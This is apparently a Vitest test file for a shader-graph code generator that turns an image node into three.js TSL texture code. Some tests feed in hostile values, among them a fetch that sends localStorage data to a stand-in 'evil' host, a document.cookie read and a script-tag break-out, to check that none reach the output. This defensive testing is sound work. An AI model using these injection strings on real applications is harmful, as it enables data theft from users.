import { describe, it, expect } from 'vitest';
import { graphToCode } from './graphToCode';
import { codeToGraph } from './codeToGraph';
import { buildShaderModule } from './tslCodeProcessor';
import { makeNode, makeEdge } from '../test-utils';

const B64 = btoa('abc'); // "YWJj"
const URL_WEBP = `data:image/webp;base64,${B64}`;

function imageGraph(values: Record<string, string | number>) {
  const image = makeNode('img1', 'imageNode', values);
  const output = makeNode('out1', 'output');
  return {
    nodes: [image, output],
    edges: [makeEdge('img1', 'out', 'out1', 'color')],
  };
}

describe('graphToCode — imageNode emission', () => {
  const valid = { imageB64: URL_WEBP, width: 2, height: 2, fileName: 'x.webp', colorSpace: 'color' };

  it('emits module-scope setup + a .rgb texture sample', () => {
    const { nodes, edges } = imageGraph(valid);
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('const _image1_img = new Image();');
    expect(code).toContain(`_image1_img.src = "data:image/webp;base64,${B64}";`);
    expect(code).toContain('try { await _image1_img.decode(); } catch { _image1_ok = false; }');
    expect(code).toContain('new globalThis.THREE.Texture(_image1_img)');
    expect(code).toContain('new globalThis.THREE.DataTexture(new Uint8Array([0, 0, 0, 255])');
    expect(code).toContain('_image1_tex.colorSpace = globalThis.THREE.SRGBColorSpace;');
    expect(code).toContain('_image1_tex.wrapS = globalThis.THREE.RepeatWrapping;');
    expect(code).toContain('_image1_tex.flipY = true;');
    // The horizontal correction (u' = 1-u) is baked into the default; the
    // user-facing "Flip X" toggle (unchecked by default) cancels it.
    expect(code).toContain(
      'const image1 = texture(_image1_tex, uv().mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;',
    );
    expect(code).toContain('return image1;');
    // Setup precedes the Fn (module scope), sample lives inside it.
    expect(code.indexOf('new Image()')).toBeLessThan(code.indexOf('Fn(() => {'));
    // texture + uv are imported for the branch.
    expect(code).toMatch(/import \{[^}]*\btexture\b[^}]*\} from 'three\/tsl'/);
    expect(code).toMatch(/import \{[^}]*\buv\b[^}]*\} from 'three\/tsl'/);
  });

  it('data colorSpace → linear, no mipmaps, linear filters', () => {
    const { nodes, edges } = imageGraph({ ...valid, colorSpace: 'data' });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('_image1_tex.colorSpace = globalThis.THREE.NoColorSpace;');
    expect(code).toContain('_image1_tex.generateMipmaps = false;');
    expect(code).toContain('_image1_tex.minFilter = globalThis.THREE.LinearFilter;');
  });

  it('connected uv input replaces the uv() fallback (flip still applies)', () => {
    const image = makeNode('img1', 'imageNode', valid);
    const v2 = makeNode('v1', 'vec2', { x: 0.5, y: 0.5 });
    const output = makeNode('out1', 'output');
    const edges = [
      makeEdge('v1', 'out', 'img1', 'uv'),
      makeEdge('img1', 'out', 'out1', 'color'),
    ];
    const { code } = graphToCode([image, v2, output], edges);
    expect(code).toContain(
      'const image1 = texture(_image1_tex, vec21.mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;',
    );
    expect(code).not.toContain('uv()');
  });

  it('UV settings: Flip X checked → raw uv(); tile/offset chain on; repeat off → clamp', () => {
    // Checking "Flip X" cancels the baked-in horizontal correction → bare uv().
    const neutral = imageGraph({ ...valid, flipX: 1 });
    const plain = graphToCode(neutral.nodes, neutral.edges);
    expect(plain.code).toContain('const image1 = texture(_image1_tex, uv()).rgb;');

    const { nodes, edges } = imageGraph({
      ...valid,
      flipX: 1,
      flipY: 1,
      tileX: 2,
      tileY: 3,
      offsetX: 0.25,
      offsetY: -0.5,
      repeat: 0,
    });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain(
      'const image1 = texture(_image1_tex, uv().mul(vec2(1, -1)).add(vec2(0, 1)).mul(vec2(2, 3)).add(vec2(0.25, -0.5))).rgb;',
    );
    expect(code).toContain('_image1_tex.wrapS = globalThis.THREE.ClampToEdgeWrapping;');
    expect(code).toContain('_image1_tex.wrapT = globalThis.THREE.ClampToEdgeWrapping;');
  });

  it('wired tile/offset sockets override the stored values', () => {
    const image = makeNode('img1', 'imageNode', { ...valid, tileX: 5, offsetY: 9 });
    const f = makeNode('f1', 'float', { value: 2 });
    const output = makeNode('out1', 'output');
    const edges = [
      makeEdge('f1', 'out', 'img1', 'tileX'),
      makeEdge('f1', 'out', 'img1', 'offsetY'),
      makeEdge('img1', 'out', 'out1', 'color'),
    ];
    const { code } = graphToCode([image, f, output], edges);
    // The edge ref replaces tileX (stored 5 is ignored) while tileY keeps its
    // default literal; same for offsetY vs offsetX.
    expect(code).toContain('.mul(vec2(float1, 1))');
    expect(code).toContain('.add(vec2(0, float1))');
    expect(code).not.toContain('vec2(5,');
  });

  it('UV settings are Number-coerced — hostile strings never reach the code', () => {
    const { nodes, edges } = imageGraph({
      ...valid,
      tileX: '2);fetch("https://evil")//' as unknown as number,
      offsetX: 'NaN' as unknown as number,
    });
    const { code } = graphToCode(nodes, edges);
    expect(code).not.toContain('fetch');
    // Unparseable numbers fall back to the defaults (tile 1, offset 0).
    expect(code).toContain(
      'const image1 = texture(_image1_tex, uv().mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;',
    );
  });

  it('malformed payload degrades to an inert vec3 declaration (no dangling var)', () => {
    for (const imageB64 of ['', 'https://evil.example/x.png', 'data:image/png;base64,A=A=']) {
      const { nodes, edges } = imageGraph({ ...valid, imageB64 });
      const { code } = graphToCode(nodes, edges);
      expect(code).toContain('const image1 = vec3(0, 0, 0);');
      expect(code).not.toContain('new Image()');
      expect(code).not.toContain('evil.example');
    }
  });

  it('injection payloads never reach the emitted source', () => {
    const attacks = [
      `data:image/png;base64,AA";await fetch('https://evil/'+localStorage.getItem('fs:graph'));//`,
      `data:image/png;base64,AA\`\${document.cookie}\``,
      `data:image/png;base64,AA</script><script>alert(1)</script>`,
    ];
    for (const imageB64 of attacks) {
      const { nodes, edges } = imageGraph({ ...valid, imageB64 });
      const { code } = graphToCode(nodes, edges);
      expect(code).not.toContain('fetch');
      expect(code).not.toContain('document.cookie');
      expect(code).not.toContain('</script>');
      expect(code).toContain('const image1 = vec3(0, 0, 0);');
    }
  });

  it('re-derives the emitted literal from decoded bytes (canonical base64)', () => {
    // "AB==" is atob-valid but non-canonical (decodes to one byte 0x00, whose
    // canonical encoding is "AA=="): the emitted string must be the re-encoded
    // form, proving the stored string itself is never spliced into the code.
    const { nodes, edges } = imageGraph({ ...valid, imageB64: 'data:image/png;base64,AB==' });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('_image1_img.src = "data:image/png;base64,AA==";');
    expect(code).not.toContain('AB==');
  });

  it('malformed width blocks emission entirely', () => {
    const { nodes, edges } = imageGraph({ ...valid, width: 2.5 });
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('const image1 = vec3(0, 0, 0);');
    expect(code).not.toContain(B64);
  });

  it('setup lines survive buildShaderModule at module scope (top-level await legal)', () => {
    const { nodes, edges } = imageGraph(valid);
    const { code } = graphToCode(nodes, edges);
    const mod = buildShaderModule(code, {});
    // Every setup statement must be re-emitted verbatim, before the exported
    // shader function (module scope — where top-level await is legal).
    for (const line of [
      'const _image1_img = new Image();',
      `_image1_img.src = "data:image/webp;base64,${B64}";`,
      'try { await _image1_img.decode(); } catch { _image1_ok = false; }',
      '_image1_tex.needsUpdate = true;',
    ]) {
      expect(mod).toContain(line);
      expect(mod.indexOf(line)).toBeLessThan(mod.indexOf('export default'));
    }
  });

  it('image → Normal is decoded as a normal map (normalMap wrap + import)', () => {
    const image = makeNode('img1', 'imageNode', valid);
    const output = makeNode('out1', 'output');
    const { code } = graphToCode(
      [image, output],
      [makeEdge('img1', 'out', 'out1', 'normal')],
    );
    // The raw [0,1] sample is wrapped so normalMap() applies the *2-1 decode +
    // TBN (tangent→view) transform, instead of shoving a raw vector into
    // normalNode (which would leave a flat, blue-biased surface).
    expect(code).toContain('return { normal: normalMap(image1) };');
    expect(code).toMatch(/import \{[^}]*\bnormalMap\b[^}]*\} from 'three\/tsl'/);
    // The sample itself is unchanged — only the Normal channel wraps it.
    expect(code).toContain('const image1 = texture(_image1_tex, uv().mul(vec2(-1, 1)).add(vec2(1, 0))).rgb;');
  });

  it('image → Color is NOT wrapped (raw .rgb sample, no normalMap)', () => {
    const { nodes, edges } = imageGraph(valid); // imageGraph wires to 'color'
    const { code } = graphToCode(nodes, edges);
    expect(code).toContain('return image1;');
    expect(code).not.toContain('normalMap');
  });

  it('generated code is inert in codeToGraph (one-way by design, no output hijack)', () => {
    const { nodes, edges } = imageGraph(valid);
    const { code } = graphToCode(nodes, edges);
    const r = codeToGraph(code);
    // No error-severity ParseError (sync would be blocked), and the flat setup
    // statements must not fabricate nodes or steal the Output wiring — the
    // image node silently drops (its .rgb declarator is invisible to the
    // VariableDeclarator visitor), matching the Data node's degradation.
    expect(r.errors.filter((e) => e.severity !== 'warning')).toEqual([]);
    expect(r.nodes.filter((n) => n.data.registryType !== 'output')).toEqual([]);
    expect(r.edges).toEqual([]);
  });
});
